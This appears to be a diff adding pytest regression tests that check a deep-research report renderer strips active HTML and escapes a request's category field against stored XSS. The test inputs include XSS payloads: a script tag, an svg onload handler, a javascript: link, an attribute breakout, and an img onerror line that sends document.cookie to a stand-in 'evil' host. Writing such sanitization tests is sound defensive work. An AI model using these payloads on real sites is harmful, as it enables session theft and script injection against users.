@@ -1041,3 +1041,70 @@ def test_chat_active_document_lookup_is_owner_scoped():
     assert "filter( DBDocument.id == active_doc_id, ).first()" not in flat
     assert "filter(DBDocument.id == active_doc_id).first()" not in flat
     assert "filter(DBDocument.id == _mem_id).first()" not in flat
+
+
+# ── research report HTML sanitization (visual report stored XSS) ──
+#
+# `src.visual_report._md_to_html` renders the deep-research report, whose
+# markdown is built from LLM output over crawled web pages (untrusted content).
+# python-markdown passes raw HTML through verbatim, and report pages are served
+# under a relaxed `script-src 'unsafe-inline'` CSP, so any markup surviving into
+# the report would execute in the app origin. The render must allowlist-sanitize.
+
+@pytest.mark.parametrize("payload", [
+    "<script>alert(document.domain)</script>",
+    '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">',
+    "<svg onload=alert(1)>",
+    '<a href="javascript:alert(1)">x</a>',
+])
+def test_md_to_html_strips_active_content(payload):
+    from src.visual_report import _md_to_html
+
+    out = _md_to_html(f"Report body.\n\n{payload}").lower()
+
+    assert "<script" not in out
+    assert "onerror=" not in out
+    assert "onload=" not in out
+    assert "javascript:" not in out
+
+
+def test_md_to_html_preserves_normal_report_formatting():
+    from src.visual_report import _md_to_html
+
+    md = (
+        "## Findings\n\n"
+        "**bold** and a [source](https://example.com/p).\n\n"
+        "| A | B |\n|---|---|\n| 1 | 2 |\n\n"
+        "```python\ndef x():\n    return 1\n```\n\n"
+        "<details>\n<summary>Raw findings</summary>\n\ncontent\n</details>\n"
+    )
+    out = _md_to_html(md)
+
+    assert "<h2 id=" in out                          # heading + toc anchor preserved
+    assert "<table" in out and "<td" in out           # table
+    assert "<pre" in out and "<code" in out           # fenced code block
+    assert "<details" in out and "<summary" in out    # collapsible raw-findings section
+    assert 'href="https://example.com/p"' in out      # external link kept
+    assert 'rel="noopener' in out                     # ...and rel-hardened
+
+
+def test_visual_report_escapes_request_category():
+    # `category` arrives straight from the /api/research/start request body with
+    # no enum validation and lands in <body class="category-{category}"> on a
+    # report page served under `script-src 'unsafe-inline'`, so it must be escaped
+    # or it's an attribute-injection XSS independent of the markdown body.
+    from src.visual_report import generate_visual_report
+
+    html = generate_visual_report(
+        question="q",
+        report_markdown="## H\n\nbody",
+        category='"><script>alert(document.domain)</script>',
+    )
+
+    assert "<script>alert(document.domain)" not in html   # no breakout
+    assert "&lt;script&gt;" in html                        # rendered as inert text
+
+    # `category` has no type check at the request boundary, so a non-string
+    # value must coerce rather than crash the render (html.escape needs a str).
+    out = generate_visual_report(question="q", report_markdown="## H", category=12345)
+    assert "category-12345" in out
